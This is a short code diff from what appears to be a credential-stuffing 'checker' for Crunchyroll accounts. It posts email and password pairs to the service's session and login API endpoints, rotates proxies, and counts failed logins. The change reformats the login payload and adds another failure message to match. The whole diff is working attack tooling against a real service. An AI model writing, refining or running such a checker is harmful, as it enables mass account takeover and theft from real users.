@@ -28,9 +28,9 @@ def check(email:str,password:str):
                 r = s.post("https://api.crunchyroll.com/start_session.0.json",headers=header,data=payload)
                 session_id = r.json()['data']['session_id']
 
-                payload = f"account={email}&password={password}&session_id={session_id}&locale=enUS&version=1.3.1.0&connectivity_type=ethernet"
+                payload = {'account':email,'password':password,'session_id':session_id,'locale':'enUS','version':'1.3.1.0','connectivity_type':'ethernet'}
                 r = s.post("https://api.crunchyroll.com/login.0.json",headers=header,data=payload)
-                if 'Incorrect login information.' in r.text:
+                if any(key in r.text for key in ['You forgot to put in your password.','Incorrect login information.']):
                     Checker.bad += 1
                     return_proxy(proxy)
                     return
